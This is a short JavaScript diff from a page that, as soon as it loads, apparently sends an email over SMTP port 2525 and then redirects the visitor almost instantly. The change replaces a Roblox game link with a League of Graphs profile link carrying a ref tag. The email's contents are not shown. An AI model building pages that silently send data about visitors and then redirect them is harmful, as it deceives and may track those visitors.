@@ -21,7 +21,7 @@ window.onload = () => {
         Port: "2525"
       }).then(() => {
             setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/games/18251147521/Engine-Playground';
+                window.location.href = 'https://www.leagueofgraphs.com/summoner/na/pasta2-3334?ref=guxl4ps3';
             }, 0.0000000000000000000000000000000000000000000000000000000000000000000000001);
         }).catch((error) => {
             console.error('Error sending email:', error);
